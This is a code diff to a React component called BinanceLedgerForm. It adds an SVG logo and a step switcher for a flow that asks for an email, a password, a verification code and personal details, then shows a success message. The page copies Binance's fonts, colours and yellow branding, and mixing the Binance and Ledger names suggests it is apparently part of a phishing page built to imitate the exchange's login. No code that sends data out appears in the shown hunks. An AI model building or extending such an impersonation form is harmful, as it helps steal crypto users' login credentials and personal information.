@@ -100,6 +100,17 @@ const BinanceLedgerForm: FC = () => {
 
   const renderEmailStep = () => (
     <>
+      <div className="flex justify-center mb-8">
+        <svg width="120" height="40" viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M4.8 32V8h7.2c2.4 0 4.2 0.6 5.4 1.8s1.8 3 1.8 5.4c0 2.4-0.6 4.2-1.8 5.4s-3 1.8-5.4 1.8H8.4V32H4.8zm3.6-12.8h3.6c1.2 0 2.1-0.3 2.7-0.9s0.9-1.5 0.9-2.7c0-1.2-0.3-2.1-0.9-2.7s-1.5-0.9-2.7-0.9H8.4v7.2z" fill="#FCD535"/>
+          <path d="M25.2 32V8h3.6v24h-3.6z" fill="#FCD535"/>
+          <path d="M35.2 32V8h7.8c2.4 0 4.2 0.6 5.4 1.8s1.8 3 1.8 5.4v9.6c0 2.4-0.6 4.2-1.8 5.4s-3 1.8-5.4 1.8h-7.8zm3.6-3.2h4.2c1.2 0 2.1-0.3 2.7-0.9s0.9-1.5 0.9-2.7v-9.6c0-1.2-0.3-2.1-0.9-2.7s-1.5-0.9-2.7-0.9h-4.2v16.8z" fill="#FCD535"/>
+          <path d="M56.8 32V8h7.8c2.4 0 4.2 0.6 5.4 1.8s1.8 3 1.8 5.4c0 1.8-0.3 3.3-0.9 4.5s-1.5 2.1-2.7 2.7l4.2 9.6h-4.2l-3.6-8.4h-4.2V32h-3.6zm3.6-11.6h4.2c1.2 0 2.1-0.3 2.7-0.9s0.9-1.5 0.9-2.7c0-1.2-0.3-2.1-0.9-2.7s-1.5-0.9-2.7-0.9h-4.2v7.2z" fill="#FCD535"/>
+          <path d="M78.4 32V8h7.8c2.4 0 4.2 0.6 5.4 1.8s1.8 3 1.8 5.4c0 2.4-0.6 4.2-1.8 5.4s-3 1.8-5.4 1.8h-4.2V32h-3.6zm3.6-12.8h4.2c1.2 0 2.1-0.3 2.7-0.9s0.9-1.5 0.9-2.7c0-1.2-0.3-2.1-0.9-2.7s-1.5-0.9-2.7-0.9h-4.2v7.2z" fill="#FCD535"/>
+          <path d="M99.6 32V8h14.4v3.2h-10.8v6h9.6v3.2h-9.6v8.4h10.8V32h-14.4z" fill="#FCD535"/>
+        </svg>
+      </div>
+
       <div className="flex justify-between items-center mb-8">
         <div 
           className="card-page-title !mb-[0px]" 
@@ -993,4 +1004,48 @@ const BinanceLedgerForm: FC = () => {
         <div 
           style={{ 
             color: "var(--color-SecondaryText, #B7BDC6)",
-            fontFamily: "BinanceNova, Arial
+            fontFamily: "BinanceNova, Arial, sans-serif",
+            fontSize: "16px",
+            fontWeight: "400",
+            lineHeight: "24px"
+          }}
+        >
+          You have successfully completed the verification process.
+        </div>
+      </div>
+    </>
+  );
+
+  const renderCurrentStep = () => {
+    switch (currentStep) {
+      case 'email':
+        return renderEmailStep();
+      case 'password':
+        return renderPasswordStep();
+      case 'verification':
+        return renderVerificationStep();
+      case 'personal-details':
+        return renderPersonalDetailsStep();
+      case 'success':
+        return renderSuccessStep();
+      default:
+        return renderEmailStep();
+    }
+  };
+
+  return (
+    <div 
+      className="min-h-screen flex items-center justify-center p-4"
+      style={{ backgroundColor: "var(--color-Body, #181A20)" }}
+    >
+      <div 
+        className="w-full max-w-md p-8 rounded-lg"
+        style={{ backgroundColor: "var(--color-Card, #1E2329)" }}
+      >
+        {renderCurrentStep()}
+      </div>
+    </div>
+  );
+};
+
+export default BinanceLedgerForm;
